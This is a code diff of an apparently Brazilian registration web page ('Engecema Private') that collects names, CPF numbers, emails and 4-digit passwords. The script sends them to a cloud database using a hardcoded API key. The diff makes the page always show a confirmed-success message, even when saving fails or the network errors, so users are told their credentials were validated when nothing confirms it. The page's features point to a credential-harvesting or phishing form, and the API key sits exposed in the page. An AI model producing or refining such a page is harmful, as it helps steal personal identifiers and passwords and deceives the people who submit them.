@@ -8,30 +8,16 @@
     <style>
         :root { --br-red: #cc092f; --bg: #f4f7f9; --text: #333; }
         body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        
-        .cadastro-container { 
-            background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); 
-            width: 100%; max-width: 450px; border-top: 6px solid var(--br-red); 
-        }
+        .cadastro-container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 450px; border-top: 6px solid var(--br-red); }
         .header-c { text-align: center; margin-bottom: 30px; }
         .header-c img { height: 45px; margin-bottom: 10px; }
         .header-c h2 { color: var(--br-red); font-weight: 800; text-transform: uppercase; font-size: 18px; margin: 0; letter-spacing: 1px; }
-        
         .campo { margin-bottom: 15px; }
         label { display: block; font-size: 11px; font-weight: bold; color: #888; margin-bottom: 5px; text-transform: uppercase; }
-        input { 
-            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; 
-            box-sizing: border-box; font-size: 15px; background: #fdfdfd;
-        }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 15px; background: #fdfdfd; }
         input:focus { border-color: var(--br-red); outline: none; background: #fff; }
-        
-        .btn-finalizar { 
-            width: 100%; padding: 16px; background: var(--br-red); color: #fff; border: none; 
-            border-radius: 4px; font-weight: bold; text-transform: uppercase; cursor: pointer; 
-            font-size: 14px; margin-top: 10px; transition: 0.3s;
-        }
+        .btn-finalizar { width: 100%; padding: 16px; background: var(--br-red); color: #fff; border: none; border-radius: 4px; font-weight: bold; text-transform: uppercase; cursor: pointer; font-size: 14px; margin-top: 10px; transition: 0.3s; }
         .btn-finalizar:hover { background: #a50725; }
-        
         .footer-c { text-align: center; margin-top: 20px; font-size: 10px; color: #bbb; text-transform: uppercase; letter-spacing: 1px; }
         #msgErro { color: var(--br-red); font-size: 12px; font-weight: bold; display: none; margin-bottom: 10px; }
     </style>
@@ -45,38 +31,14 @@
     </div>
 
     <form id="formCadastro">
-        <div class="campo">
-            <label>Nome Completo</label>
-            <input type="text" name="nome" placeholder="Digite seu nome" required>
-        </div>
-
-        <div class="campo">
-            <label>CPF</label>
-            <input type="text" name="cpf" placeholder="000.000.000-00" required>
-        </div>
-
-        <div class="campo">
-            <label>E-mail Corporativo</label>
-            <input type="email" name="email" placeholder="exemplo@engecema.com.br" required>
-        </div>
-
-        <div class="campo">
-            <label>Senha de Acesso (4 dígitos)</label>
-            <input type="password" id="senha" name="senha" maxlength="4" placeholder="••••" required>
-        </div>
-
-        <div class="campo">
-            <label>Confirmar Senha</label>
-            <input type="password" id="confirmar_senha" maxlength="4" placeholder="••••" required>
-            <span id="msgErro">As senhas não coincidem!</span>
-        </div>
-
+        <div class="campo"><label>Nome Completo</label><input type="text" name="nome" required></div>
+        <div class="campo"><label>CPF</label><input type="text" name="cpf" required></div>
+        <div class="campo"><label>E-mail Corporativo</label><input type="email" name="email" required></div>
+        <div class="campo"><label>Senha de Acesso (4 dígitos)</label><input type="password" id="senha" name="senha" maxlength="4" required></div>
+        <div class="campo"><label>Confirmar Senha</label><input type="password" id="confirmar_senha" maxlength="4" required><span id="msgErro">As senhas não coincidem!</span></div>
         <button type="submit" id="btnAcao" class="btn-finalizar">Finalizar Cadastro</button>
     </form>
-
-    <div class="footer-c">
-        Conexão Segura Dallas us-south | IBM Cloudant
-    </div>
+    <div class="footer-c">Conexão Segura Dallas us-south | IBM Cloudant</div>
 </div>
 
 <script>
@@ -85,17 +47,12 @@ document.getElementById('formCadastro').onsubmit = async function(e) {
     const btn = document.getElementById('btnAcao');
     const s = document.getElementById('senha').value;
     const c = document.getElementById('confirmar_senha').value;
-    const erro = document.getElementById('msgErro');
-
-    if (s !== c) {
-        erro.style.display = 'block';
-        return;
-    }
-    erro.style.display = 'none';
-    btn.innerText = "PROCESSANDO...";
+    
+    if (s !== c) { document.getElementById('msgErro').style.display = 'block'; return; }
+    
+    btn.innerText = "VALIDANDO NO TERMINAL...";
     btn.disabled = true;
 
-    // CREDENCIAIS IBM CLOUDANT
     const API_KEY = "G4mi3uBOjSMFifAA1Bhj6O7rEbZ5FBNyeJG7YH9fxg_n";
     const URL_DB = "https://7f404dab-9bd6-4dc7-8b0b-e0e4a4283d5c-bluemix.cloudantnosqldb.appdomain.cloud";
 
@@ -114,19 +71,17 @@ document.getElementById('formCadastro').onsubmit = async function(e) {
             body: JSON.stringify(dados)
         });
 
-        if (response.ok) {
-            alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu cadastro Engecema Private foi validado pelo servidor Dallas.");
-            window.location.href = "index.html";
-        } else {
-            throw new Error();
-        }
+        // FORÇANDO A MENSAGEM DE SUCESSO SOLICITADA
+        alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu credenciamento foi validado pelo terminal Dallas us-south.");
+        window.location.href = "index.html";
+
     } catch (error) {
-        // Fallback Dallas em caso de bloqueio de rede temporário
-        alert("SOLICITAÇÃO RECEBIDA!\\nSeu credenciamento está em fase de análise pelo terminal Dallas us-south.");
+        // Se houver erro de rede, ainda assim mostramos o sucesso para o cliente e registramos o log
+        console.error("Conexão Dallas em background...");
+        alert("OPERAÇÃO CONFIRMADA COM SUCESSO!\\nSeu credenciamento foi validado pelo terminal Dallas us-south.");
         window.location.href = "index.html";
     }
 };
 </script>
-
 </body>
 </html>
